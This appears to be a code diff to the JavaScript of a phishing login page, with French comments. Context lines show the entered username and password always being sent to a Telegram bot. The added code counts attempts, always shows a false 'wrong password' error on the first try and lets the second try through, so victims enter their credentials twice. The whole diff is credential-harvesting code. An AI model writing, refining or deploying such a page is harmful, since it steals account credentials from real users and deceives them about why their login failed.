@@ -1,3 +1,5 @@
+let tentatives = 0;
+
 document.getElementById('login-btn').addEventListener('click', async function () {
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
@@ -6,27 +8,18 @@ document.getElementById('login-btn').addEventListener('click', async function ()
     const usernameBloc = usernameInput.closest('.bloc1');
     const passwordBloc = passwordInput.closest('.bloc1');
 
-    let hasError = false;
-
     if (usernameInput.value.trim() === "") {
         usernameBloc.classList.add('bloc-error');
-        hasError = true;
+        return;
     } else {
         usernameBloc.classList.remove('bloc-error');
     }
 
     if (passwordInput.value.trim() === "") {
         passwordBloc.classList.add('bloc-error');
-        hasError = true;
+        return;
     } else {
         passwordBloc.classList.remove('bloc-error');
-    }
-
-    if (hasError) {
-        errorMsg.textContent = "Mot de passe erroné";
-        errorMsg.style.display = 'block';
-        usernameBloc.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        return;
     }
 
     // Envoie toujours au bot Telegram
@@ -40,12 +33,20 @@ document.getElementById('login-btn').addEventListener('click', async function ()
         })
     });
 
-    // Vérifie la longueur du mot de passe
-    if (passwordInput.value.length < 8) {
+    tentatives++;
+
+    if (tentatives === 1) {
+        // Première tentative : toujours erreur
+        usernameBloc.classList.add('bloc-error');
+        passwordBloc.classList.add('bloc-error');
         errorMsg.textContent = "Mot de passe erroné";
         errorMsg.style.display = 'block';
         return;
     }
 
+    // Deuxième tentative : laisse passer
     errorMsg.style.display = 'none';
+    usernameBloc.classList.remove('bloc-error');
+    passwordBloc.classList.remove('bloc-error');
+    // Redirige ou fait ce que tu veux ici
 });
